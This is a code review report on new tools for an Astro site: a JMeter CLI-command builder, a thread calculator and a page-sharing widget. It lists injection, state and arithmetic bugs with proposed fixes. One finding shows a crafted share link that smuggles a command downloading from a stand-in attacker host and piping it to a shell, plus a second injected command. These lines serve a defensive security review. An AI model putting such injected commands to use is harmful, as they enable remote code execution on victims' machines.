---
phase: 00-working-tree
reviewed: 2026-08-18T16:00:00Z
depth: standard
files_reviewed: 14
files_reviewed_list:
  - astro.config.mjs
  - src/components/DiscoverMenu.astro
  - src/components/Header.astro
  - src/pages/collections/[id].astro
  - src/pages/plugin/[id].astro
  - src/pages/vendor/[slug].astro
  - src/components/AskAboutPage.astro
  - src/pages/tools/cli-builder.astro
  - src/pages/tools/index.astro
  - src/pages/tools/thread-calculator.astro
  - src/utils/cliBuilder.ts
  - src/utils/threadCalc.ts
  - tests/unit/cliBuilder.test.ts
  - tests/unit/threadCalc.test.ts
findings:
  critical: 0
  warning: 5
  info: 4
  total: 9
status: issues_found
---

# Phase 00: Code Review Report (working tree)

**Reviewed:** 2026-08-18T16:00:00Z **Depth:** standard **Files Reviewed:** 14 **Status:**
issues_found

## Summary

Uncommitted work adds an Ask-about-this-page widget on plugin/vendor/collection pages, a Tools
section (CLI builder + thread calculator), Discover/Header links, and a sitemap rule for `/tools/`.
Nav wiring, sitemap priority, schema, and Astro escaping on the widget links look sound. The
calculator math itself matches Little's law, and the CLI builder correctly avoids `innerHTML`.
Issues are concentrated in share-URL state (mode flip, unsanitized shell tokens) and two user-facing
correctness gaps (formula units, Copy-for-AI ignoring the custom prompt). No Critical findings:
nothing is executed server-side, and generated commands are shown as text.

## Warnings

### WR-01: CLI builder emits unquoted URL-controlled tokens into shell commands

**File:** `src/utils/cliBuilder.ts:59-62`, `src/utils/cliBuilder.ts:83-113`,
`src/utils/cliBuilder.ts:186-187` **Issue:** `quoteIfNeeded` only wraps whitespace. Paths, remotes,
`-J` values, and plugin IDs from the share URL (`plan`, `results`, `log`, `reportdir`, `remote`,
`props`, `plugins`) are interpolated raw. A crafted link such as
`?plan=test.jmx;curl%20evil.example|sh` or `?plugins=jpgc-tst;id` produces a command the victim is
invited to copy-run. Embedded `"` also breaks the existing quotes (`"my "plan".jmx"`). The app does
not execute the string, but this is still share-URL command injection / broken quoting. **Fix:**
Quote for the selected shell, and allowlist tokens that must not be free-form paths:

```ts
export function quoteIfNeeded(path: string, os: CliOs): string {
  const needsQuote = os === 'windows'
    ? /[\s"&|<>^%]/.test(path)
    : /[\s"'\\$`;&|<>(){}[\]!*?#~]/.test(path);
  if (!needsQuote) return path;
  if (os === 'windows') return `"${path.replace(/"/g, '""')}"`;
  return `'${path.replace(/'/g, `'\\''`)}'`;
}

const PLUGIN_ID = /^[A-Za-z0-9._-]+$/;
export function buildInstallCommand(state: CliBuilderState): string | null {
  const plugins = state.plugins.map((p) => p.trim()).filter((p) => PLUGIN_ID.test(p));
  if (plugins.length === 0) return null;
  return `${pluginManagerCmdName(state.os)} install ${plugins.join(',')}`;
}
```

Apply the same allowlist to property keys (`^[A-Za-z0-9._-]+$`) and remote hosts (hostname / IPv4 /
IPv6). Drop rejected tokens instead of echoing them.

### WR-02: CLI builder flips from `run` to `full` on refresh when plugins are present

**File:** `src/pages/tools/cli-builder.astro:402-416`, `src/pages/tools/cli-builder.astro:535-537`,
`src/utils/cliBuilder.ts:144-157` **Issue:** Visiting `/tools/cli-builder/` with `installIds` in
localStorage seeds `state.plugins` but leaves `mode` as `'run'`. `syncUrl()` then writes
`?plugins=…` and omits `mode` (it equals the default). On reload, `has('plugins')` is true, so the
`else if` forces `mode = 'full'`. The install pane appears and a second command is added without the
user changing anything. The same path prevents persisting an explicit “Run test” choice whenever any
plugin checkbox is still checked, because default `mode=run` is never written to the URL. **Fix:**
Promote to `full` when seeding from localStorage, and always persist `mode` once plugins are in
play:

```ts
if (!params.has('plugins')) {
  try {
    const installIds = JSON.parse(localStorage.getItem('installIds') || '[]');
    if (Array.isArray(installIds)) {
      state.plugins = installIds.filter((x) => typeof x === 'string');
      if (state.plugins.length > 0) state.mode = 'full';
    }
  } catch { /* ignore */ }
} else if (!params.has('mode') && state.plugins.length > 0) {
  state.mode = 'full';
}
```

```ts
// serializeCliState
if (state.mode !== DEFAULT_CLI_STATE.mode || state.plugins.length > 0) {
  params.set('mode', state.mode);
}
```

### WR-03: Thread-calculator formula text mixes units and is arithmetically wrong

**File:** `src/pages/tools/thread-calculator.astro:376-379` **Issue:** `formatMs(2500)` yields
`2.5s`, then the UI prints `threads = 100 RPS × (2.5s cycle ÷ 1000) = 250`.
`100 × (2.5 / 1000) = 0.25`, not 250. The `÷ 1000` only makes sense when the cycle is still in
milliseconds. The FAQ on the same page states the correct model (`100 × 2.5 = 250`). **Fix:**

```ts
formulaEl.textContent =
  `threads = ${input.targetRps} RPS × ${formatMs(result.cycleTimeMs)} cycle` +
  ` = ${result.rawThreads}` +
  (input.headroomPct > 0 ? ` → +${input.headroomPct}% headroom = ${result.threads}` : '');
```

### WR-04: Thread calculator does not validate `headroomPct` (or clamp URL input)

**File:** `src/utils/threadCalc.ts:47-67`, `src/utils/threadCalc.ts:91-98` **Issue:**
`computeThreads` rejects non-finite / non-positive RPS and negative times, but any finite
`headroomPct` is accepted. `?headroom=-100` yields `threads = 0`; `?headroom=500` inflates the count
6×. `applyToForm` writes that value into a `min=0`/`max=100` range input (the browser clamps the
slider) while `render(initial)` still uses the unclamped parse, so the label/result disagree with
the slider until the next `input` event. **Fix:** Clamp on parse and reject nonsense in the model:

```ts
function clamp(n: number, min: number, max: number): number {
  return Math.min(max, Math.max(min, n));
}

export function parseThreadCalc(params: URLSearchParams): ThreadCalcInput {
  return {
    targetRps: parseNum(params.get('rps'), DEFAULT_THREAD_CALC_INPUT.targetRps),
    responseTimeMs: parseNum(params.get('rt'), DEFAULT_THREAD_CALC_INPUT.responseTimeMs),
    thinkTimeMs: parseNum(params.get('tt'), DEFAULT_THREAD_CALC_INPUT.thinkTimeMs),
    headroomPct: clamp(parseNum(params.get('headroom'), DEFAULT_THREAD_CALC_INPUT.headroomPct), 0, 100),
  };
}

// in computeThreads, after the finite checks:
if (headroomPct < 0 || headroomPct > 100) return null;
```

### WR-05: “Copy for AI” ignores the `prompt` prop

**File:** `src/components/AskAboutPage.astro:13-16`, `src/components/AskAboutPage.astro:37-38`,
`src/components/AskAboutPage.astro:107-110` **Issue:** ChatGPT/Claude/Perplexity/Gemini links use
the per-page `prompt` (plugin name, vendor, collection, tool context). The copy button always writes
`Please read this page and be ready to answer questions about it: ` + URL. `data-page-title` is
written and never read. Plugin/vendor/collection pages therefore lose the tailored context the rest
of the widget was added to provide. **Fix:** Persist the prompt on the wrapper and copy it:

```astro
<div
  class={`ask-about-page … ${className}`}
  data-page-url={pageUrl}
  data-prompt={basePrompt}
>
```

```js
const url = wrapper ? wrapper.getAttribute('data-page-url') : window.location.href;
const prompt =
  (wrapper && wrapper.getAttribute('data-prompt')) ||
  'Please read this page and be ready to answer questions about it';
navigator.clipboard.writeText(`${prompt}: ${url}`).then(/* … */);
```

## Info

### IN-01: Unused `pageTitle` / `data-page-title`

**File:** `src/components/AskAboutPage.astro:12`, `src/components/AskAboutPage.astro:38` **Issue:**
`pageTitle` is `Astro.url.pathname` and is only stored in `data-page-title`, which the inline script
never reads. Dead attribute; remove it or include a human title in the copied text.

### IN-02: `formatMs` can print `1m 60s`

**File:** `src/utils/threadCalc.ts:101-105` **Issue:** `Math.round((ms % 60_000) / 1000)` becomes
`60` for values such as `119500`, producing `1m 60s` instead of `2m`. Carry the extra second into
minutes when `sec === 60`.

### IN-03: Stale comment — thread calculator does not touch `localStorage`

**File:** `src/utils/threadCalc.ts:4` **Issue:** The file header says DOM and localStorage I/O live
in `thread-calculator.astro`. That page only reads the query string. Update the comment so it does
not imply persistence that is not there.

### IN-04: `normalizeProperties` drops valid `key=value=with=equals` lines

**File:** `src/utils/cliBuilder.ts:65-68` **Issue:** `^[^=]+=[^=]*$` rejects any value containing
`=`. JMeter properties (and some JVM-style settings) can include `=`. Prefer splitting on the first
`=` (`/^([^=]+)=(.*)$/`) and keep the remainder intact, then still allowlist the key.
